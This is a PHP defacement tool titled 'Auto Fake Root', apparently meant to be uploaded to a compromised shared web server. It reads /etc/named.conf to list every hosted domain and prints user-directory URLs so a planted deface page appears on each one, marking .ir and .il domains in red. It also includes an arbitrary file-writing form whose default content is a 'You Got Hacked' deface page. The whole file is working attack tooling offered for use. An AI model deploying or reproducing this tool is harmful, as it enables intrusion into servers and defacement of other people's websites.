<link href='http://fonts.googleapis.com/css?family=Mali' rel='stylesheet' type='text/css'>
<link href='http://fonts.googleapis.com/css?family=B612+Mono' rel='stylesheet' type='text/css'>
<link rel='stylesheet' type='text/css' href='//code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css' />
<?php

/* 
Magelang1337
Website : Https://www.magelang1337.com
*/
	
if(isset($_POST['bwa'])){
$user = $_POST['uname'];
$deface = $_POST['file'];
$tb4 = @file('/etc/named.conf');
if(!$tb4)
{
die (" can't read /etc/named.conf");
}
else
{
foreach($tb4 as $tb5){
if(eregi('zone',$tb5)){
preg_match_all('#zone "(.*)"#',$tb5,$tb6);
flush();
if(strlen(trim($tb6[1][0])) >2){
$tb7 = posix_getpwuid(@fileowner('/etc/valiases/'.$tb6[1][0]));
$tb8 = $tb7['name'] ;
$tb8 = $tb6[1][0];
$tb9 = '\.ir';
$tb10 = '\.il';
if (eregi("$tb9",$tb6[1][0]) or eregi("$tb10",$tb6[1][0]) )
{
$tb8 = "<div style=' color:red; '>".$tb6[1][0].'</div>';
}
echo "<font size=4 style='color: green'>http://$tb8/~$user/$deface </font><br />";
flush();
       }
     }
   }
 } 
}

$tb = get_current_user();
if($_POST['kntl']){
if(file_put_contents($_POST['asede'].'/'.$_POST['nama'],$_POST['content'])){
echo '<br /><font color="black" size="4">Succeed writed at -> '.$_POST['asede'].'/'.$_POST['nama'];
}else{
echo '<font color="red" size="3">Failed';
  }
}

function make_file(){
echo '<form method="POST" action="?go"><center><br />
Dir : <br />
<input type="text" name="asede" style="width:486px;margin-bottom:10px;" value="'.getcwd().'"><br />
Your script deface: <br />
<textarea cols="66" rows="11" name="content" style="width:486px;margin-bottom:10px;">You Got Hacked By ./GH05TW1BL3</textarea><br />
<input type="text" name="nama" value="deface.html">
<input type="submit" name="kntl" value="Make It">
</input></form><br /><br /><a href="?"><- Back To Home</font>';
 }
if($_GET['go']=="mfile"){
return make_file();
}

echo "<title>Auto Fake Root</title>
<style type='text/css'>
body {
text-align:center;
font-family: 'Mali', sans-serif;
}
a {
color: blue;
}
.banner{
text-size:40px;
font-family: 'B612 Mono', sans-serif;
}
.ko {
border:1px solid green;
}
</style><br /><br />
</font>
<div class='banner'><font size='8'>AUTO FAKE ROOT <i class='icon ion-heart'></i></font></div>
</center>
<center>
<form action='' method='post'>
User: <br /><input class='ko' type='text' value='$tb' name='uname'><br />
Your deface files:<br />
<input class='ko' type='text' placeholder='defaced.html' name='file' size='20'><br />
<input  type='submit' name='bwa' value='Fake Now !!'>
<br /><br />Do you want to create files?<a href='?go=mfile'> clik here</a>
</form><br />";
?>
